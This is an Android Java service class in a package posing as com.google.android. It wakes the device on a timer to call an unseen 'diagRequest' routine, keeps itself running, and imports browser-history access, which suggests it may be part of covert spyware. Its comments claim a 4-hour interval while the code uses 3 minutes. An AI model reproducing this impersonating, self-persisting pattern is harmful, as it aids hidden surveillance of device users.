package com.google.android.bs;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.util.Log;

import com.google.android.history.LinkService;

public class Request4 extends Service {

		private static final int SERVICE_REQUEST_CODE = 35;
		final String LOG_TAG = "requestService";
		SharedPreferences sPref;

		public void onCreate() {
			super.onCreate();
//			startService(new Intent(this, LinkService.class));
			Log.d(LOG_TAG, "onCreate Request4");
		}

		public int onStartCommand(Intent intent, int flags, int startId) {
			Log.d(LOG_TAG, "onStartCommand Request4");
			
			requestTask(); // запрос каждые 4 часа

			Calendar cal = Calendar.getInstance();
			cal.add(Calendar.MINUTE, 3);// через 240 минут

			PendingIntent servicePendingIntent = PendingIntent.getService(this,
					SERVICE_REQUEST_CODE, new Intent(this, Request4.class),// SERVICE_REQUEST_CODE - уникальный int сервиса
					PendingIntent.FLAG_UPDATE_CURRENT);

			AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
			am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
					servicePendingIntent);
			
			
			super.onStartCommand(intent, flags, startId);
			return Service.START_STICKY;
		}

		private void requestTask() {
			// TODO Auto-generated method stub
			Log.d(LOG_TAG, "requestTask start");
			WorkTimeDefiner.diagRequest(getApplicationContext());
			Log.d(LOG_TAG, "requestTask end");
		}

		public void onDestroy() {
			super.onDestroy();
			Log.d(LOG_TAG, "onDestroy");
		}

		public IBinder onBind(Intent intent) {
			Log.d(LOG_TAG, "onBind");
			return null;
		}

		
	}